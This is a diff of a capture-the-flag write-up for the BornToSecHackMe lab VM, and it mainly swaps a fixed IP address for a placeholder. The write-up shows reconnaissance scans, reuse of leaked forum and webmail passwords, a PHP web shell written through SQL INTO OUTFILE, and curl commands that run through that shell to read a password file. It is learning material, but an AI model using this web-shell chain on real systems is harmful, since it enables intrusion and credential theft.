@@ -42,7 +42,7 @@ Now, we try to test the `dynamic` type addresses with the `ping` command.
 Several addresses send back a `pong`, we can try them one by one with `nmap` to see if anything is up on those:
 
 ```bash
-λ nmap 192.168.1.22 
+λ nmap 192.168.1.22
 Nmap scan report for IP (IP)
 Host is up (0.0055s latency).
 Not shown: 987 filtered ports
@@ -65,14 +65,14 @@ Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
 
 ### WEB
 
-The address `192.168.1.22` has a website that shows us a page with` HACK ME` written in it. After various tests and some research we finded different ways to discover other accessible pages.
-  
+The address `{IP_VM}` has a website that shows us a page with` HACK ME` written in it. After various tests and some research we finded different ways to discover other accessible pages.
+
 We used `web scanners` `Arachni`, `dirb` and`nikto`, all present by default on the `kali` OS.
 
 We will be working with the `Kali` OS on`wsl` from now on because it includes most of the `Pen Testing` tools that we will need later.
 
 ```bash
-└─$ dirb https://192.168.1.22/
+└─$ dirb https://{IP_VM}/
 
 -----------------
 DIRB v2.22
@@ -80,31 +80,31 @@ By The Dark Raver
 -----------------
 
 START_TIME: Wed Sep  8 13:21:51 2021
-URL_BASE: https://192.168.1.22/
+URL_BASE: https://{IP_VM}/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612
 
----- Scanning URL: https://192.168.1.22/ ----
-+ https://192.168.1.22/cgi-bin/ (CODE:403|SIZE:289)
-==> DIRECTORY: https://192.168.1.22/forum/
-==> DIRECTORY: https://192.168.1.22/phpmyadmin/
-+ https://192.168.1.22/server-status (CODE:403|SIZE:294)
-==> DIRECTORY: https://192.168.1.22/webmail/
+---- Scanning URL: https://{IP_VM}/ ----
++ https://{IP_VM}/cgi-bin/ (CODE:403|SIZE:289)
+==> DIRECTORY: https://{IP_VM}/forum/
+==> DIRECTORY: https://{IP_VM}/phpmyadmin/
++ https://{IP_VM}/server-status (CODE:403|SIZE:294)
+==> DIRECTORY: https://{IP_VM}/webmail/
 ```
 
-  
+
 Thanks to these `web scanners` we identify new accessible pages:`/forum`, `/phpmyadmin`,`/webmail`. In the forum post `Login problem?`, We can see connection attempts with different usernames and what looks like a password:
 
 ```bash
-Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Failed password for invalid user !q\\\]Ej?\*5K5cy\*AJ from 161.202.39.38 port 57764 ssh2  
-Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail \[preauth\]  
+Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Failed password for invalid user !q\\\]Ej?\*5K5cy\*AJ from 161.202.39.38 port 57764 ssh2
+Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail \[preauth\]
 Oct 5 08:46:01 BornToSecHackMe CRON\[7549\]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
 ```
 
-We managed to log in with the username `lmezard` and the password `!q\\\]Ej?\*5K5cy\*AJ` to the forum. On the user's profile we can get the user's email address: `laurie@borntosec.net`. We try to log into `http://192.168.1.22/webmail` with the email address and the previous password. We connect successfully.
+We managed to log in with the username `lmezard` and the password `!q\\\]Ej?\*5K5cy\*AJ` to the forum. On the user's profile we can get the user's email address: `laurie@borntosec.net`. We try to log into `http://{IP_VM}/webmail` with the email address and the previous password. We connect successfully.
 One of the user's emails gives us access to the `phpmyadmin` page:
 
 ```
@@ -123,31 +123,31 @@ phpmyadmin password: `Fg-'kKXBj87E:aJ$`
 Now that we have root access to the SQL database, we are trying to do an exploit called `web shell`. Thanks to `dirb` we can obtain a list of the directories used by the site:
 
 ```bash
-└─$ dirb https://192.168.1.22/forum/
+└─$ dirb https://{IP_VM}/forum/
 
 ...
 
-==> DIRECTORY: https://192.168.1.22/forum/js/
-==> DIRECTORY: https://192.168.1.22/forum/lang/
-==> DIRECTORY: https://192.168.1.22/forum/modules/
-==> DIRECTORY: https://192.168.1.22/forum/templates_c/
-==> DIRECTORY: https://192.168.1.22/forum/themes/
-==> DIRECTORY: https://192.168.1.22/forum/update/
+==> DIRECTORY: https://{IP_VM}/forum/js/
+==> DIRECTORY: https://{IP_VM}/forum/lang/
+==> DIRECTORY: https://{IP_VM}/forum/modules/
+==> DIRECTORY: https://{IP_VM}/forum/templates_c/
+==> DIRECTORY: https://{IP_VM}/forum/themes/
+==> DIRECTORY: https://{IP_VM}/forum/update/
 
-└─$ dirb https://192.168.1.22/webmail/
+└─$ dirb https://{IP_VM}/webmail/
 
 ...
 
-==> DIRECTORY: https://192.168.1.22/webmail/plugins/
-==> DIRECTORY: https://192.168.1.22/webmail/src/
-==> DIRECTORY: https://192.168.1.22/webmail/themes/
+==> DIRECTORY: https://{IP_VM}/webmail/plugins/
+==> DIRECTORY: https://{IP_VM}/webmail/src/
+==> DIRECTORY: https://{IP_VM}/webmail/themes/
 ```
 
 We are trying to get the default folder from the web server:
 
 ```bash
-└─$ whatweb https://192.168.1.22/
-https://192.168.1.22/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.1.22], Title[404 Not Found]
+└─$ whatweb https://{IP_VM}/
+https://{IP_VM}/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[{IP_VM}], Title[404 Not Found]
 ```
 The server is running on Apache 2 so `/var/www` should be the default folder.
 
@@ -169,14 +169,14 @@ SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/v
 We retrieve the name of our user:
 
 ```bash
-└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=whoami
+└─$ curl -k https://{IP_VM}/forum/templates_c/curl_shell.php?cmd=whoami
 www-data
 ```
 
 We can look now for all the files our current user has created:
 
 ```bash
-└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=find+/+-user+www-data+\|head+-10
+└─$ curl -k https://{IP_VM}/forum/templates_c/curl_shell.php?cmd=find+/+-user+www-data+\|head+-10
 /home
 /home/LOOKATME
 /home/LOOKATME/password
@@ -191,7 +191,7 @@ We can look now for all the files our current user has created:
 There is a folder written `LOOKATME` and a file `password`:
 
 ```bash
-└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=cat+/home/LOOKATME/password
+└─$ curl -k https://{IP_VM}/forum/templates_c/curl_shell.php?cmd=cat+/home/LOOKATME/password
 lmezard:G!@M6f4Eatau{sF"
 ```
 
@@ -199,13 +199,13 @@ Password of lmezard : `G!@M6f4Eatau{sF"`
 
 We can now try to connect in ssh to our VM.
 ```bash
-└─$ ssh lmezard@192.168.1.22
+└─$ ssh lmezard@{IP_VM}
 ...
-lmezard@192.168.1.22's password:
+lmezard@{IP_VM}'s password:
 Permission denied, please try again.
 ```
 too bad, let's try again with the `ssh` port finded with nmap before, it's not working neither...
-Let's try with the `ftp` port 21 with an external software and `lmezard` credential. It's working !! 
+Let's try with the `ftp` port 21 with an external software and `lmezard` credential. It's working !!
 
 ### FTP ACCESS - lmezard
 
@@ -219,7 +219,7 @@ Now we have access to a file `README` and `fun`. The readme file say that we hav
 fun: POSIX tar archive (GNU)
 ```
 
-The `fun` file seems to be a tared file, so we should untar it first:  
+The `fun` file seems to be a tared file, so we should untar it first:
 ```bash
 └─$ sudo tar xvf fun
 ...
@@ -230,7 +230,7 @@ ft_fun/Y8S1M.pcap
 
 Now we have a folder called `ft_fun` with a lot of `pcap` files.
 
-We can find a `main`: 
+We can find a `main`:
 ```bash
 └─$ grep main * -A35 -B2
 BJPCP.pcap-     printf("Hahahaha Got you!!!\n");
@@ -273,7 +273,7 @@ BJPCP.pcap-     printf("Hahahaha Got you!!!\n");
 BJPCP.pcap-}void useless() {
 ```
 
-Now we have to find all the `getme` files. We can find some with `grep "getme" * -A5` But some other are dispatched in mutiples files. By following the next files we can get the actual codes of the functions. After this we just have to compile and execute the `c` code: 
+Now we have to find all the `getme` files. We can find some with `grep "getme" * -A5` But some other are dispatched in mutiples files. By following the next files we can get the actual codes of the functions. After this we just have to compile and execute the `c` code:
 ```bash
 └─$ gcc main.c
 
@@ -287,9 +287,9 @@ Now SHA-256 it and submi
 
 Now we can try again to connect in ssh with user `laurie` and password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` :
 ```bash
-└─$ ssh laurie@192.168.1.22
+└─$ ssh laurie@{IP_VM}
 ...
-laurie@192.168.1.22's password:
+laurie@{IP_VM}'s password:
 laurie@BornToSecHackMe:~$ ls
 bomb  README
 ```
@@ -321,10 +321,10 @@ It seems that we must find passwords by diffusing the `bomb` file..
 We copy the `bomb` file to disassemble it with`ghidra` or `gdb`:
 
 ```bash
-└─$ scp -r -p laurie@192.168.1.22:bomb .
+└─$ scp -r -p laurie@{IP_VM}:bomb .
 ...
-laurie@192.168.1.22's password: 
-bomb                                                                                               100%   26KB   6.1MB/s   00:00    
+laurie@{IP_VM}'s password:
+bomb                                                                                               100%   26KB   6.1MB/s   00:00
 ```
 
 We realize that we have to solve different phases to diffuse the bomb
